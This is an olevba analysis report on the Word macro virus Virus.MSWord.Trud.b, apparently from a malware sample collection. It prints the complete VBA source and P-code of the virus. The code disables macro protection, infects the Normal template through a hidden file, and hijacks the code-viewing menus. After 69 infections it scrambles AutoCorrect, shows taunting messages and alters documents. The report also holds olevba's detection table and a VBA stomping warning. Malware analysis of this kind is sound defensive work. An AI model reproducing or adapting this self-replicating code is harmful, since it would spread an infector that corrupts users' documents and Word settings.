olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trud.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Trud.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error GoTo hometime
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
hohoho = 0
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt > 0 And ad > 0 Then GoTo hometime
If Dir("c:\winini.log", vbSystem) = "" And nt = 0 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\winini.log"
    SetAttr "c:\winini.log", vbSystem
    host.codemodule.AddFromFile ("c:\winini.log")
    host.codemodule.replaceline 5, "Private Sub Document_Close()"
    host.codemodule.replaceline 75, "Sub ViewVBCode()"
    host.codemodule.replaceline 78, "Sub ToolsMacro()"
Else
    plop = ActiveDocument.Saved
    plop2 = True
    Set host = ActiveDocument.VBProject.VBComponents.Item(1)
    host.codemodule.AddFromFile ("c:\winini.log")
End If
For x = 1 To 4
    host.codemodule.deletelines 1
Next x
hohoho = hohoho + 1
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 6, "hohoho = " & hohoho
If hohoho = 69 Then
    AutoCorrect.ReplaceText = True
    For z = 1 To AutoCorrect.Entries.Count
        txt1 = AutoCorrect.Entries.Item(z).Name
        txt2 = AutoCorrect.Entries.Item(z).Value
        AutoCorrect.Entries.Item(z).Value = "xyz"
        AutoCorrect.Entries.Item(z).Name = txt2
        AutoCorrect.Entries.Item(z).Value = txt1
    Next z
End If
If hohoho >= 69 Then
    Application.Caption = "Microsoft Turd"
    For x = 0 To 250 Step 50
    For y = 0 To 250 Step 50
        ActiveDocument.Shapes.AddShape(msoShapeSmileyFace, x, y, 50, 50).Fill.ForeColor.RGB = RGB(x, y, 250 - x)
    Next y
    Next x
    Set bln = Assistant.NewBalloon
    With bln
        .Heading = "Isn't life just a bitch"
        .Text = "Choose an option."
        .Labels(1).Text = "Loose all your data."
        .Labels(2).Text = "Loose most of your data."
        .Labels(3).Text = "Loose just enough data to really fuck you off"
        .BalloonType = msoBalloonTypeButtons
        .Mode = msoModeModal
        .Show
    End With
    With ActiveDocument.Content
        .InsertParagraphBefore
        .InsertBefore "Don't Worry About a Thing !!!    I wouldn't fuck up your data !!!"
    End With
    With ActiveDocument.Paragraphs(1).Range.Font
        .ColorIndex = wdGreen
        .Size = 24
    End With
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If plop2 Then ActiveDocument.Saved = plop
hometime:
End Sub
Private Sub Junk1()
    MsgBox ("Essential DLL missing.  Please reinstall Microsoft Office.")
End Sub
Private Sub junk2()
    MsgBox ("Essential DLL missing.  Please reinstall Microsoft Office.")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Trud.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5299 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError hometime 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	LitDI2 0x0000 
' 	St hohoho 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #8:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo hometime 
' 	EndIf 
' Line #9:
' 	LitStr 0x000D "c:\winini.log"
' 	Ld vbSystem 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #11:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #12:
' 	LitStr 0x000D "c:\winini.log"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #13:
' 	LitStr 0x000D "c:\winini.log"
' 	Ld vbSystem 
' 	ArgsCall SetAttr 0x0002 
' Line #14:
' 	LitStr 0x000D "c:\winini.log"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #15:
' 	LitDI2 0x0005 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #16:
' 	LitDI2 0x004B 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #17:
' 	LitDI2 0x004E 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St plop 
' Line #20:
' 	LitVarSpecial (True)
' 	St plop2 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #22:
' 	LitStr 0x000D "c:\winini.log"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0001 
' Line #26:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld hohoho 
' 	LitDI2 0x0001 
' 	Add 
' 	St hohoho 
' Line #28:
' 	LitDI2 0x0006 
' 	LitStr 0x0009 "hohoho = "
' 	Ld hohoho 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #29:
' 	Ld hohoho 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitVarSpecial (True)
' 	Ld AutoCorrect 
' 	MemSt ReplaceText 
' Line #31:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	MemLd Count 
' 	For 
' Line #32:
' 	Ld z 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St txt1 
' Line #33:
' 	Ld z 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	St txt2 
' Line #34:
' 	LitStr 0x0003 "xyz"
' 	Ld z 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #35:
' 	Ld txt2 
' 	Ld z 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #36:
' 	Ld txt1 
' 	Ld z 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #37:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld hohoho 
' 	LitDI2 0x0045 
' 	Ge 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000E "Microsoft Turd"
' 	Ld Application 
' 	MemSt Caption 
' Line #41:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FA 
' 	LitDI2 0x0032 
' 	ForStep 
' Line #42:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FA 
' 	LitDI2 0x0032 
' 	ForStep 
' Line #43:
' 	Ld x 
' 	Ld y 
' 	LitDI2 0x00FA 
' 	Ld x 
' 	Sub 
' 	ArgsLd RSet 0x0003 
' 	Ld msoShapeSmileyFace 
' 	Ld x 
' 	Ld y 
' 	LitDI2 0x0032 
' 	LitDI2 0x0032 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #44:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set bln 
' Line #47:
' 	StartWithExpr 
' 	Ld bln 
' 	With 
' Line #48:
' 	LitStr 0x0017 "Isn't life just a bitch"
' 	MemStWith Heading 
' Line #49:
' 	LitStr 0x0011 "Choose an option."
' 	MemStWith Then 
' Line #50:
' 	LitStr 0x0014 "Loose all your data."
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Labels 0x0001 
' 	MemSt Then 
' Line #51:
' 	LitStr 0x0018 "Loose most of your data."
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Labels 0x0001 
' 	MemSt Then 
' Line #52:
' 	LitStr 0x002D "Loose just enough data to really fuck you off"
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Labels 0x0001 
' 	MemSt Then 
' Line #53:
' 	Ld msoBalloonTypeButtons 
' 	MemStWith BalloonType 
' Line #54:
' 	Ld msoModeModal 
' 	MemStWith Mode 
' Line #55:
' 	ArgsMemCallWith Show 0x0000 
' Line #56:
' 	EndWith 
' Line #57:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	With 
' Line #58:
' 	ArgsMemCallWith InsertParagraphBefore 0x0000 
' Line #59:
' 	LitStr 0x0041 "Don't Worry About a Thing !!!    I wouldn't fuck up your data !!!"
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #60:
' 	EndWith 
' Line #61:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Font 
' 	With 
' Line #62:
' 	Ld wdGreen 
' 	MemStWith ColorIndex 
' Line #63:
' 	LitDI2 0x0018 
' 	MemStWith Size 
' Line #64:
' 	EndWith 
' Line #65:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld plop2 
' 	If 
' 	BoSImplicit 
' 	Ld plop 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #68:
' 	Label hometime 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Private Sub Junk1())
' Line #71:
' 	LitStr 0x003A "Essential DLL missing.  Please reinstall Microsoft Office."
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Private Sub junk2())
' Line #74:
' 	LitStr 0x003A "Essential DLL missing.  Please reinstall Microsoft Office."
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #75:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

